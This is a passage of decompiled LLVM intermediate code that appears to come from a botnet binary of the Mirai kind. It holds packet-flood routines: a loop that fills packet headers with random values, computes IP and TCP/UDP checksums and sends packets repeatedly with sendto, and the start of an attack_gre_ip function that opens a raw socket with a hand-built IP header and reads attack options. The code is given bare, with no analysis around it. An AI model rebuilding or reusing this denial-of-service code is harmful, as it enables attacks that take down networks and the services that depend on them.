dec_label_pc_8e10:                                ; preds = %bb88, %.thread11, %dec_label_pc_8ff0
  %v0_8e10 = call i32 @rand_next()
  store i32 %v0_8e10, i32* %r0.global-to-local, align 4
  store i32 %v0_8e10, i32* %stack_var_-48, align 4
  %v0_8e18 = call i32 @rand_next()
  store i32 %v0_8e18, i32* %r0.global-to-local, align 4
  store i32 %v0_8e18, i32* %stack_var_-52, align 4
  %v0_8e20 = call i32 @rand_next()
  store i32 %v2_8e24, i32* %r1.global-to-local, align 4
  store i32 %v0_8e20, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_8e30 = load i32, i32* @r7, align 4
  store i32 %v0_8e30, i32* %r0.global-to-local, align 4
  %v3_8e34 = call i32 @util_memcpy(i32 %v0_8e30, i32 %v2_8e24, i32 4)
  %v0_8e38 = load i32, i32* @r7, align 4
  %v1_8e38 = add i32 %v0_8e38, 6
  store i32 %v1_8e38, i32* %r0.global-to-local, align 4
  store i32 %v2_8e3c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_8e44 = call i32 @util_memcpy(i32 %v1_8e38, i32 %v2_8e3c, i32 4)
  %v0_8e48 = load i32, i32* @r7, align 4
  %v1_8e48 = add i32 %v0_8e48, 4
  store i32 %v1_8e48, i32* %r0.global-to-local, align 4
  store i32 %v2_8e4c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e54 = call i32 @util_memcpy(i32 %v1_8e48, i32 %v2_8e4c, i32 2)
  store i32 %v2_8e58, i32* %r1.global-to-local, align 4
  %v0_8e5c = load i32, i32* @r7, align 4
  %v1_8e5c = add i32 %v0_8e5c, 10
  store i32 %v1_8e5c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e64 = call i32 @util_memcpy(i32 %v1_8e5c, i32 %v2_8e58, i32 2)
  store i32 %v3_8e64, i32* %r0.global-to-local, align 4
  store i32 %v1_8ab4, i32* %r1.global-to-local, align 4
  store i1 %v2_8e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e6c, label %dec_label_pc_8e74, label %dec_label_pc_8ffc

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e10, %dec_label_pc_8ffc
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_8e78 = load i32, i32* @r5, align 4
  %v3_8e78 = add i32 %v2_8e78, 10
  %v4_8e78 = inttoptr i32 %v3_8e78 to i16*
  store i16 0, i16* %v4_8e78, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e80 = load i32, i32* @r5, align 4
  store i32 %v0_8e80, i32* @r0, align 4
  %v2_8e84 = call i32 @checksum_generic(i32 %v0_8e80, i32 20)
  %v3_8e84 = trunc i32 %v2_8e84 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_8e8c = load i32, i32* @r5, align 4
  %v4_8e8c = add i32 %v3_8e8c, 10
  %v5_8e8c = inttoptr i32 %v4_8e8c to i16*
  store i16 %v3_8e84, i16* %v5_8e8c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e94 = load i32, i32* %r3.global-to-local, align 4
  %v1_8e94 = trunc i32 %v0_8e94 to i16
  %v2_8e94 = load i32, i32* @r6, align 4
  %v3_8e94 = add i32 %v2_8e94, 10
  %v4_8e94 = inttoptr i32 %v3_8e94 to i16*
  store i16 %v1_8e94, i16* %v4_8e94, align 2
  %v0_8e98 = load i32, i32* @r6, align 4
  store i32 %v0_8e98, i32* @r0, align 4
  %v2_8e9c = call i32 @checksum_generic(i32 %v0_8e98, i32 20)
  %v3_8e9c = trunc i32 %v2_8e9c to i16
  store i32 %v2_8e9c, i32* %r0.global-to-local, align 4
  %v3_8ea0 = load i32, i32* @r6, align 4
  %v4_8ea0 = add i32 %v3_8ea0, 10
  %v5_8ea0 = inttoptr i32 %v4_8ea0 to i16*
  store i16 %v3_8e9c, i16* %v5_8ea0, align 2
  store i32 0, i32* @r4, align 4
  %v0_8ea8 = load i32, i32* @r8, align 4
  store i32 %v0_8ea8, i32* @r1, align 4
  %v1_8eac = add i32 %v0_8ea8, 4
  %v2_8eac = inttoptr i32 %v1_8eac to i16*
  %v3_8eac = load i16, i16* %v2_8eac, align 2
  %v4_8eac = zext i16 %v3_8eac to i32
  store i32 %v4_8eac, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_8eb4 = add i32 %v0_8ea8, 6
  %v4_8eb4 = inttoptr i32 %v3_8eb4 to i16*
  store i16 0, i16* %v4_8eb4, align 2
  %v0_8eb8 = load i32, i32* @r6, align 4
  store i32 %v0_8eb8, i32* %r0.global-to-local, align 4
  %v4_8ebc = call i32 @checksum_tcpudp(i32 %v0_8eb8, i32 %v0_8ea8, i32 %v4_8eac, i32 %stack_var_-136.0.ph)
  %v5_8ebc = trunc i32 %v4_8ebc to i16
  store i32 %v4_8ebc, i32* %r0.global-to-local, align 4
  %v3_8ec0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8ec0, i32* %r2.global-to-local, align 4
  %v3_8ec4 = mul i32 %v3_8ec0, 32
  store i32 %v3_8ec4, i32* %r3.global-to-local, align 4
  %v0_8ec8 = load i32, i32* @r5, align 4
  %v1_8ec8 = add i32 %v0_8ec8, 16
  %v2_8ec8 = inttoptr i32 %v1_8ec8 to i32*
  %v3_8ec8 = load i32, i32* %v2_8ec8, align 4
  %v5_8ecc = mul i32 %v3_8ec0, 24
  store i32 %v5_8ecc, i32* %r3.global-to-local, align 4
  %v1_8ed0 = load i32, i32* @sb, align 4
  %v2_8ed0 = add i32 %v1_8ed0, %v5_8ecc
  store i32 %v2_8ed0, i32* @lr, align 4
  %v2_8ed4 = add i32 %v2_8ed0, 4
  %v3_8ed4 = inttoptr i32 %v2_8ed4 to i32*
  store i32 %v3_8ec8, i32* %v3_8ed4, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_8edc = load i32, i32* @r8, align 4
  %v4_8edc = add i32 %v3_8edc, 6
  %v5_8edc = inttoptr i32 %v4_8edc to i16*
  store i16 %v5_8ebc, i16* %v5_8edc, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_8ee4 = load i32, i32* %r1.global-to-local, align 4
  %v1_8ee4 = trunc i32 %v0_8ee4 to i16
  %v2_8ee4 = load i32, i32* %r3.global-to-local, align 4
  %v3_8ee4 = load i32, i32* @sb, align 4
  %v4_8ee4 = add i32 %v3_8ee4, %v2_8ee4
  %v5_8ee4 = inttoptr i32 %v4_8ee4 to i16*
  store i16 %v1_8ee4, i16* %v5_8ee4, align 2
  %v0_8ee8 = load i32, i32* @r4, align 4
  %v1_8ee8 = trunc i32 %v0_8ee8 to i16
  %v2_8ee8 = load i32, i32* @lr, align 4
  %v3_8ee8 = add i32 %v2_8ee8, 2
  %v4_8ee8 = inttoptr i32 %v3_8ee8 to i16*
  store i16 %v1_8ee8, i16* %v4_8ee8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8ef0 = load i32, i32* @r5, align 4
  store i32 %v0_8ef0, i32* %r1.global-to-local, align 4
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_8efc = load i32, i32* @lr, align 4
  %v0_8f00 = load i32, i32* %ip.global-to-local, align 4
  %v6_8f04 = call i32 @__libc_sendto(i32 %v3_8afc, i32 %v0_8ef0, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_8efc, i32 %v0_8f00)
  %v3_8f08 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8f08, i32* %r3.global-to-local, align 4
  %v1_8f0c = add i32 %v3_8f08, 1
  store i32 %v1_8f0c, i32* %r0.global-to-local, align 4
  %v1_8f10 = load i32, i32* @sl, align 4
  %v9_8f10 = icmp eq i32 %v1_8f0c, %v1_8f10
  store i1 %v9_8f10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8f0c, i32* %stack_var_-44, align 4
  %v6_8f18 = icmp slt i32 %v1_8f0c, %v1_8f10
  br i1 %v6_8f18, label %dec_label_pc_8d9c, label %dec_label_pc_8d88

dec_label_pc_8f20:                                ; preds = %dec_label_pc_8d9c
  %v1_8f20 = add i32 %v2_8da4, 16
  %v2_8f20 = inttoptr i32 %v1_8f20 to i32*
  %v3_8f20 = load i32, i32* %v2_8f20, align 4
  store i32 %v3_8f20, i32* %r4.global-to-local, align 4
  %v0_8f24 = call i32 @rand_next()
  store i32 %v0_8f24, i32* %r0.global-to-local, align 4
  %v3_8f28 = load i32, i32* %stack_var_-44, align 4
  %v5_8f30 = mul i32 %v3_8f28, 24
  %v0_8f34 = load i32, i32* %r4.global-to-local, align 4
  %v1_8f34 = and i32 %v0_8f34, 16711680
  store i32 %v1_8f34, i32* %ip.global-to-local, align 4
  %v3_8f38 = udiv i32 %v0_8f34, 16777216
  %v4_8f3c = udiv i32 %v1_8f34, 256
  %v5_8f3c = or i32 %v4_8f3c, %v3_8f38
  store i32 %v5_8f3c, i32* %r2.global-to-local, align 4
  %v1_8f40 = load i32, i32* @sb, align 4
  %v2_8f40 = add i32 %v1_8f40, %v5_8f30
  store i32 %v2_8f40, i32* %r1.global-to-local, align 4
  %v1_8f44 = and i32 %v0_8f34, 65280
  store i32 %v1_8f44, i32* %r3.global-to-local, align 4
  %v1_8f48 = add i32 %v2_8f40, 20
  %v2_8f48 = inttoptr i32 %v1_8f48 to i8*
  %v3_8f48 = load i8, i8* %v2_8f48, align 1
  %v4_8f48 = zext i8 %v3_8f48 to i32
  store i32 %v4_8f48, i32* %ip.global-to-local, align 4
  %v5_8f50 = call i32 @llvm.bswap.i32(i32 %v0_8f34)
  %v7_8f54 = lshr i32 %v0_8f24, %v4_8f48
  %v8_8f54 = add i32 %v7_8f54, %v5_8f50
  store i32 %v8_8f54, i32* %r2.global-to-local, align 4
  %v1_8f58 = and i32 %v8_8f54, 16711680
  store i32 %v1_8f58, i32* %r0.global-to-local, align 4
  store i32 %v6_8ae8, i32* %r1.global-to-local, align 4
  %v5_8f70 = call i32 @llvm.bswap.i32(i32 %v8_8f54)
  store i32 %v5_8f70, i32* %r3.global-to-local, align 4
  store i1 %v7_8dcc, i1* %cpsr_z.global-to-local, align 1
  %v1_8f78 = load i32, i32* @r5, align 4
  %v2_8f78 = add i32 %v1_8f78, 16
  %v3_8f78 = inttoptr i32 %v2_8f78 to i32*
  store i32 %v5_8f70, i32* %v3_8f78, align 4
  br i1 %v2_8dcc, label %dec_label_pc_8f80, label %dec_label_pc_8dd4

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f20, %dec_label_pc_8dc8
  %v0_8f80 = call i32 @rand_next()
  store i32 %v0_8f80, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_8f8c = load i32, i32* @fp, align 4
  %v9_8f8c = icmp eq i32 %v0_8f8c, 65535
  store i1 %v9_8f8c, i1* %cpsr_z.global-to-local, align 1
  %v1_8f90 = load i32, i32* @r5, align 4
  %v2_8f90 = add i32 %v1_8f90, 12
  %v3_8f90 = inttoptr i32 %v2_8f90 to i32*
  store i32 %v0_8f80, i32* %v3_8f90, align 4
  br i1 %v9_8f8c, label %dec_label_pc_8f98, label %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge

dec_label_pc_8f80.dec_label_pc_8de4_crit_edge:    ; preds = %dec_label_pc_8f80
  %v1_8de8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8de4

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f80, %dec_label_pc_8dd4
  %v0_8f98 = call i32 @rand_next()
  %v3_8fa0 = urem i32 %v0_8f98, 65536
  store i32 %v3_8fa0, i32* %r0.global-to-local, align 4
  store i32 %v3_8b48, i32* %r2.global-to-local, align 4
  %v1_8fac = sub nsw i32 999, %v3_8fa0
  store i32 %v1_8fac, i32* %r3.global-to-local, align 4
  %v1_8fb0 = load i32, i32* %r4.global-to-local, align 4
  %v9_8fb0 = icmp eq i32 %v3_8b48, %v1_8fb0
  store i1 %v9_8fb0, i1* %cpsr_z.global-to-local, align 1
  %v1_8fb4 = trunc i32 %v0_8f98 to i16
  %v2_8fb4 = load i32, i32* @r5, align 4
  %v3_8fb4 = add i32 %v2_8fb4, 4
  %v4_8fb4 = inttoptr i32 %v3_8fb4 to i16*
  store i16 %v1_8fb4, i16* %v4_8fb4, align 2
  %v0_8fb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_8fb8 = trunc i32 %v0_8fb8 to i16
  %v2_8fb8 = load i32, i32* @r6, align 4
  %v3_8fb8 = add i32 %v2_8fb8, 4
  %v4_8fb8 = inttoptr i32 %v3_8fb8 to i16*
  store i16 %v1_8fb8, i16* %v4_8fb8, align 2
  br i1 %v9_8fb0, label %dec_label_pc_8fc0, label %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge

dec_label_pc_8f98.dec_label_pc_8df0_crit_edge:    ; preds = %dec_label_pc_8f98
  %v1_8df4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8df0

dec_label_pc_8fc0:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_8de4
  %v0_8fc0 = call i32 @rand_next()
  %v1_8fc0 = trunc i32 %v0_8fc0 to i16
  store i32 %v0_8fc0, i32* %r0.global-to-local, align 4
  store i32 %v3_8b4c, i32* %r3.global-to-local, align 4
  %v1_8fc8 = load i32, i32* %r4.global-to-local, align 4
  %v9_8fc8 = icmp eq i32 %v3_8b4c, %v1_8fc8
  store i1 %v9_8fc8, i1* %cpsr_z.global-to-local, align 1
  %v3_8fcc = load i32, i32* @r5, align 4
  %v4_8fcc = add i32 %v3_8fcc, 58
  %v5_8fcc = inttoptr i32 %v4_8fcc to i16*
  store i16 %v1_8fc0, i16* %v5_8fcc, align 2
  br i1 %v9_8fc8, label %dec_label_pc_8fd4, label %dec_label_pc_8dfc

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fc0, %dec_label_pc_8df0
  %v0_8fd4 = call i32 @rand_next()
  %v1_8fd4 = trunc i32 %v0_8fd4 to i16
  store i32 %v0_8fd4, i32* %r0.global-to-local, align 4
  store i32 %v1_8b40, i32* @r4, align 4
  store i1 %v2_8fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8fdc, label %.thread31, label %bb88

.thread31:                                        ; preds = %dec_label_pc_8fd4
  %v3_8fe432 = load i32, i32* @r8, align 4
  %v4_8fe433 = add i32 %v3_8fe432, 2
  %v5_8fe434 = inttoptr i32 %v4_8fe433 to i16*
  store i16 %v1_8fd4, i16* %v5_8fe434, align 2
  br label %dec_label_pc_8ff0

bb88:                                             ; preds = %dec_label_pc_8fd4
  %v1_8fe0 = load i32, i32* @r5, align 4
  %v2_8fe0 = add i32 %v1_8fe0, 16
  %v3_8fe0 = inttoptr i32 %v2_8fe0 to i32*
  %v4_8fe0 = load i32, i32* %v3_8fe0, align 4
  store i32 %v4_8fe0, i32* %r3.global-to-local, align 4
  %v3_8fe4 = load i32, i32* @r8, align 4
  %v4_8fe4 = add i32 %v3_8fe4, 2
  %v5_8fe4 = inttoptr i32 %v4_8fe4 to i16*
  store i16 %v1_8fd4, i16* %v5_8fe4, align 2
  %v1_8fe8 = load i32, i32* %r3.global-to-local, align 4
  %v2_8fe8 = load i32, i32* @r6, align 4
  %v3_8fe8 = add i32 %v2_8fe8, 16
  %v4_8fe8 = inttoptr i32 %v3_8fe8 to i32*
  store i32 %v1_8fe8, i32* %v4_8fe8, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8ff0:                                ; preds = %.thread31, %dec_label_pc_8dfc
  %v0_8ff0 = call i32 @rand_next()
  store i32 %v0_8ff0, i32* %r0.global-to-local, align 4
  %v1_8ff4 = load i32, i32* @r6, align 4
  %v2_8ff4 = add i32 %v1_8ff4, 16
  %v3_8ff4 = inttoptr i32 %v2_8ff4 to i32*
  store i32 %v0_8ff0, i32* %v3_8ff4, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8e10
  %v0_8ffc = load i32, i32* @r8, align 4
  %v1_8ffc = add i32 %v0_8ffc, 8
  store i32 %v1_8ffc, i32* %r0.global-to-local, align 4
  store i32 %v6_8a94, i32* %r1.global-to-local, align 4
  %v2_9004 = inttoptr i32 %v1_8ffc to i16*
  %v3_9004 = call i32 @rand_str(i16* %v2_9004, i32 %v6_8a94)
  store i32 %v3_9004, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8e74

dec_label_pc_900c:                                ; preds = %dec_label_pc_8b0c
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  %v1_9010 = call i32 @__GI___libc_close(i32 %v3_8afc)
  store i32 %v1_9010, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9014

dec_label_pc_9014:                                ; preds = %entry, %dec_label_pc_900c
  %v1_901c = phi i32 [ %v3_8afc, %entry ], [ %v1_9010, %dec_label_pc_900c ]
  store i32 %v3_89ac, i32* %r4.global-to-local, align 4
  store i32 %v6_89ac, i32* %r5.global-to-local, align 4
  store i32 %v24_89ac, i32* %fp.global-to-local, align 4
  ret i32 %v1_901c

dec_label_pc_9020:                                ; preds = %dec_label_pc_8b34
  %v1_9028 = add i32 %v6_8a94, 8
  store i32 %v1_9028, i32* %r1.global-to-local, align 4
  %v1_902c = add i32 %v6_8a94, 66
  store i32 %v1_902c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_8d88.preheader

; uselistorder directives
  uselistorder i32 %v1_902c, { 1, 0 }
  uselistorder i32 %v1_9028, { 1, 0 }
  uselistorder i16 %v1_8fd4, { 1, 0 }
  uselistorder i32 %v0_8fd4, { 1, 0 }
  uselistorder i32 %v0_8fc0, { 1, 0 }
  uselistorder i32 %v3_8fa0, { 1, 0 }
  uselistorder i32 %v0_8f98, { 1, 0 }
  uselistorder i32 %v5_8f70, { 1, 0 }
  uselistorder i32 %v0_8f34, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8f10, { 1, 2, 0 }
  uselistorder i32 %v1_8f0c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_8ec0, { 1, 0, 2 }
  uselistorder i32 %v4_8ebc, { 1, 0 }
  uselistorder i32 %v0_8ea8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8e9c, { 1, 0 }
  uselistorder i32 %v7_8db0, { 2, 1, 0, 3 }
  uselistorder i1 %v7_8dcc, { 2, 1, 0 }
  uselistorder i1 %v2_8fdc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_8d20, { 1, 0, 2 }
  uselistorder i32 %v3_8b9c, { 1, 0 }
  uselistorder i32 %v3_8b80, { 1, 2, 0 }
  uselistorder i32 %v1_8b7c, { 1, 0 }
  uselistorder i32 %v1_8b40, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8b3c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8b38, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8b34, { 1, 0, 2, 3 }
  uselistorder i1 %v7_8b2c, { 1, 0 }
  uselistorder i1 %v7_8b00, { 1, 0 }
  uselistorder i32 %v3_8afc, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_8ae8, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_8ab4, { 1, 2, 3, 0 }
  uselistorder i32 %v6_8a94, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8a48, { 1, 2, 0 }
  uselistorder i32 %v1_8a24, { 3, 2, 1, 0 }
  uselistorder i32 %v6_8a1c, { 1, 0 }
  uselistorder i32 %v6_89e0, { 2, 1, 3, 0 }
  uselistorder i32 %v2_89c8, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 27, 26, 28, 29, 31, 30, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 8, 6, 10, 9, 12, 11, 13, 15, 14, 16, 18, 17, 19, 20, 21, 22, 24, 23, 27, 25, 26, 30, 28, 29, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9014, { 1, 0 }
  uselistorder label %dec_label_pc_8e74, { 1, 0 }
  uselistorder label %dec_label_pc_8e10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d88, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8d88.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @attack_gre_ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9040 = load i32, i32* @r4, align 4
  %v6_9040 = load i32, i32* @r5, align 4
  %v24_9040 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_905c = call i32 @calloc(i32 %arg1, i32 4)
  %v0_9060 = load i32, i32* @r5, align 4
  store i32 %v0_9060, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9070 = load i32, i32* @r4, align 4
  %v5_9074 = inttoptr i32 %v0_9060 to i32*
  %v6_9074 = call i32 @attack_get_opt_int(i32 %v0_9070, i32* %v5_9074, i32 2, i32 0, i32 %v2_905c)
  %v1_9080 = urem i32 %v6_9074, 256
  store i32 %v1_9080, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_908c = load i32, i32* @r5, align 4
  store i32 %v0_908c, i32* %r1.global-to-local, align 4
  %v0_9090 = load i32, i32* @r4, align 4
  %v5_9094 = trunc i32 %v6_9074 to i8
  %v6_9098 = inttoptr i32 %v0_908c to i32*
  %v7_9098 = call i32 @attack_get_opt_int(i32 %v0_9090, i32* %v6_9098, i32 3, i32 65535, i32 %v6_9074)
  %v0_909c = load i32, i32* @r5, align 4
  store i32 %v0_909c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9098, i32* %fp.global-to-local, align 4
  %v0_90ac = load i32, i32* @r4, align 4
  %v5_90b0 = inttoptr i32 %v0_909c to i32*
  %v6_90b0 = call i32 @attack_get_opt_int(i32 %v0_90ac, i32* %v5_90b0, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_90b8 = urem i32 %v6_90b0, 256
  store i32 %v1_90b8, i32* %ip.global-to-local, align 4
  %v0_90bc = load i32, i32* @r5, align 4
  store i32 %v0_90bc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_90c8 = load i32, i32* @r4, align 4
  %v6_90d0 = inttoptr i32 %v0_90bc to i32*
  %v7_90d0 = call i32 @attack_get_opt_int(i32 %v0_90c8, i32* %v6_90d0, i32 5, i32 1, i32 %v1_90b8)
  %v1_90dc = urem i32 %v7_90d0, 256
  store i32 %v1_90dc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_90e8 = load i32, i32* @r5, align 4
  store i32 %v0_90e8, i32* %r1.global-to-local, align 4
  %v0_90ec = load i32, i32* @r4, align 4
  %v5_90f4 = inttoptr i32 %v0_90e8 to i32*
  %v6_90f4 = call i32 @attack_get_opt_int(i32 %v0_90ec, i32* %v5_90f4, i32 6, i32 65535, i32 %v1_90dc)
  %v0_90fc = load i32, i32* @r5, align 4
  store i32 %v0_90fc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_90f4, i32* @r8, align 4
  %v0_910c = load i32, i32* @r4, align 4
  %v5_9110 = inttoptr i32 %v0_90fc to i32*
  %v6_9110 = call i32 @attack_get_opt_int(i32 %v0_910c, i32* %v5_9110, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_9114 = load i32, i32* @r5, align 4
  store i32 %v0_9114, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_9110, i32* @r7, align 4
  %v0_9124 = load i32, i32* @r4, align 4
  %v5_9128 = inttoptr i32 %v0_9114 to i32*
  %v6_9128 = call i32 @attack_get_opt_int(i32 %v0_9124, i32* %v5_9128, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9138 = load i32, i32* @r5, align 4
  store i32 %v0_9138, i32* %r1.global-to-local, align 4
  %v0_913c = load i32, i32* @r4, align 4
  %v5_9140 = inttoptr i32 %v0_9138 to i32*
  %v6_9140 = call i32 @attack_get_opt_int(i32 %v0_913c, i32* %v5_9140, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9148 = urem i32 %v6_9140, 256
  store i32 %v1_9148, i32* %ip.global-to-local, align 4
  %v0_914c = load i32, i32* @r5, align 4
  store i32 %v0_914c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9158 = load i32, i32* @r4, align 4
  %v5_9160 = inttoptr i32 %v0_914c to i32*
  %v6_9160 = call i32 @attack_get_opt_int(i32 %v0_9158, i32* %v5_9160, i32 19, i32 0, i32 %v1_9148)
  %v0_9168 = load i32, i32* @r5, align 4
  store i32 %v0_9168, i32* %r1.global-to-local, align 4
  %v2_916c = load i32, i32* @global_var_2471c.58, align 4
  store i32 %v2_916c, i32* %r3.global-to-local, align 4
  store i32 %v6_9160, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9178 = load i32, i32* @r4, align 4
  %v5_917c = inttoptr i32 %v0_9168 to i32*
  %v6_917c = call i32 @attack_get_opt_int(i32 %v0_9178, i32* %v5_917c, i32 25, i32 %v2_916c, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9190 = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_9194 = icmp eq i32 %v3_9190, -1
  store i1 %v7_9194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9194, label %dec_label_pc_9634, label %dec_label_pc_91a0

dec_label_pc_91a0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_91a8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_91a8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_91bc = call i32 @__GI_setsockopt(i32 %v3_9190, i32 0, i32 3, i32 %v6_91a8, i32 4)
  %v7_91c0 = icmp eq i32 %v5_91bc, -1
  store i1 %v7_91c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_91c0, label %dec_label_pc_962c, label %dec_label_pc_91c8

dec_label_pc_91c8:                                ; preds = %dec_label_pc_91a0
  %v0_91c8 = load i32, i32* @r8, align 4
  %v0_91cc = load i32, i32* @r7, align 4
  %v0_91d0 = load i32, i32* %fp.global-to-local, align 4
  %v0_91d4 = load i32, i32* @r6, align 4
  %v1_91d4 = urem i32 %v0_91d4, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_91dc = urem i32 %v0_91c8, 65536
  store i32 %v3_91dc, i32* %r3.global-to-local, align 4
  %v3_91e0 = urem i32 %v0_91cc, 65536
